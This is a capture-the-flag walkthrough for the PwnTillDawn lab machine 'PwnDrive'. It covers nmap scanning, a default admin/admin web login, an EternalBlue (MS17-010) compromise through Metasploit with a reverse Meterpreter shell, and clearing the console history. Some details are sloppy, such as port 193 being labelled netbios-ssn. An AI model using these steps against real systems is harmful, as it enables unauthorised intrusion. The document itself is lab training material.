# PwnTillDwn Walkthrough PwnDrive

## Target Profile
* **Hostname: PwnDrive** 
* **IP Address: 10.150.150.11**
* **Operating System: Windows** 
* **Objective: Retrieve FLAG1**

## 1. Reconnaissance
The engagement began with active network mapping and target identification to understand the scope of the PwnTillDawn environment.

**Network Discovery**  

An initial ping sweep was executed across the subnet to identify live hosts without aggressively scanning ports.

**Command** : 

```bash
sudo nmap 10.150.150.10-254
```

* **Result** : This confirmed the presence of active machines on the network and verified our specific target was reachable.

**Target Identification**  

Utilizing the PwnTillDawn platform, a specific target machine was selected for this engagement.
* **Target IP Address** : 10.150.150.11.
* **Operating System** : Windows.

## 2. Scanning

Once the target was confirmed as a live host, a comprehensive port and service scan was executed to identify potential entry points, host details, and vulnerabilities.

**Service Enumeration Command** :

```bash
nmap -sC -sV -T4 10.150.150.11
```

**Key Findings** :

It discovered multiple open TCP ports :

  * `21/tcp` (ftp)
  * `80/tcp` (http)
  * `135/tcp` (msrpc)
  * `193/tcp` (netbios-ssn)
  * `443/tcp` (ssl/http)	
  * `445/tcp` (Microsoft-ds)

**Hostname Discovery** : 

During the Nmap service enumeration, the SSL certificate and NTLM info scripts revealed the target's NetBIOS and DNS computer name to be `PwnDrive`.

**Vulnerability Identification** : 

We have Apache running on port 80 & 443. Looking at the site running, we get:

## 3. Gaining Access
We do see a Sign in button. Clicking on it, we get a login screen. By using username and password as ‘admin’, we get access as an administrator.

**Crucial Discovery** : 

We able to find a personal files that belong to admin but didn’t able to decrypt the information. As well as some registered users information that is stored inside.

**Exploitation Steps** :

* We also have port 445 open. So I decide to test if the machine was vulnerable to Eternalblue by using command below :

  ```bash
 nmap -p445 --script smb-vuln-ms17-010 10.150.150.11

The result says the state of the port is vulnerable and from here we can use good ol’ Metasploit to exploit this vulnerability.
  ```
* Searched for applicable modules with the command : 

  ```bash
  search eternal
  ```

* Selected the `windows/x64/meterpreter/reverse_tcp` module by entering :

  ```bash
  use 0
  ```

* Reviewed the default module parameters using :

  ```bash
  show options
  ```

* Configured the target parameters :

  ```bash
  set RHOST 10.150.150.11
  set LHOST tun0
  ```

* Executed the attack against the target using the command :

  ```bash
  exploit
  ```

**Exploit Results** :

After setting the required options , we get a shell. Shows that we successfully connect to target ip.

  ```bash
  shell
  ```

**System Compromise** :
Looking around the Administrator’s Desktop Dir, we can get the flag 
```bash
  cd ..\..\User
dir
cd Administrator
dir Desktop
start FLAG1.txt
  ```
Problem is there is no flag inside FLAG1.txt and its end of it but we can confirm from text file name itself is a flag.

## 4. Escalate Privileges
The initial access gained via the http, we can create new user. Filling in the username and assign role for the user either ‘user’ and ‘admin’

## 5. Maintain Access
Establishing persistence mechanisms, such as creating backdoors or adding new administrator accounts, was out of scope for this specific PwnTillDawn engagement. The primary objective was achieved upon initial system compromise and flag extraction.

## 6. Clear Tracks
To adhere to post-exploitation best practices and sanitize the local attacker environment, the operational history within the Metasploit Framework was reviewed and subsequently purged.

* **Review History** :

  First, the `history` command was executed to review the session's actions. The console displayed the log of commands used during the exploitation phase .
    
  ```bash
  history
  ```

* **Clear History** :

  The `history -c` command was then executed to wipe the record.
  
  ```bash
  history -c
  ```

* **System Response** :

  The console returned the message `[+] Command history and history file cleared`. This ensured that sensitive commands, target IPs, and methodologies used during the session were removed from the local Kali Linux logs.

* **Confirmation** :

  Finally, the `history` command was executed once more to verify the deletion. The output displayed only the current 1 history command, confirming the operational tracks were successfully and completely cleared.
  
  ```bash
  history
  ```
